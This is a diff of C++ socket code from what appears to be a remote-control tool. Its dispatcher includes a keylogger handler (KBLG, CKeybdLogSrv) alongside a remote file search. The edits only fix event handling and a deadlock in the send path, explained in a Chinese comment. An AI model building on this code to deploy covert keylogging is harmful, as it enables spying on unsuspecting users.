@@ -50,7 +50,7 @@ CTCPSocket(hSock,FLAG_ACCEPTED)
 	//
 	m_lpWriteBuf = 0;
 	m_WriteBufSize = 0;
-	m_hEvent = CreateEvent(0, 0, TRUE, 0);
+	m_hEvent = CreateEvent(0, FALSE, TRUE, 0);
 	
 	m_pHandler = NULL;
 }
@@ -210,7 +210,11 @@ void CClient::OnSend(
 	void * lpParam, 
 	DWORD Error)
 {
-	SetEvent(m_hEvent);
+	//SetEvent(m_hEvent)
+	/*
+		应该使用TCPSocket自带的hEvent,否则在Send失败的时候如果
+		忘记SetEvent的话会造成死锁.
+	*/
 }
 
 void CClient::OnRecvCompletePacket(BYTE * lpData, UINT32 Size)
@@ -274,6 +278,7 @@ void CClient::OnRecvCompletePacket(BYTE * lpData, UINT32 Size)
 		case FILEMGR_SEARCH:
 			m_pHandler = new CFileMgrSearchSrv(this);
 			break;
+
 		case KBLG:
 			m_pHandler = new CKeybdLogSrv(this);
 			break;
@@ -336,7 +341,7 @@ void CClient::Send(BYTE *lpData, UINT32 Size, BOOL Block)
 
 	memcpy(pkt + 1, lpData, Size - sizeof(pkt_head));
 
-	CTCPSocket::Send(m_lpWriteBuf, Size, NULL);
+	CTCPSocket::Send(m_lpWriteBuf, Size, NULL,NULL, m_hEvent);
 }
 
 void CClient::Send(vec * Bufs, int nBuf, BOOL Block)
@@ -373,7 +378,7 @@ void CClient::Send(vec * Bufs, int nBuf, BOOL Block)
 		//else skip this buffer;
 	}
 
-	CTCPSocket::Send(m_lpWriteBuf, Size, NULL);
+	CTCPSocket::Send(m_lpWriteBuf, Size, NULL,NULL,m_hEvent);
 }
 
 
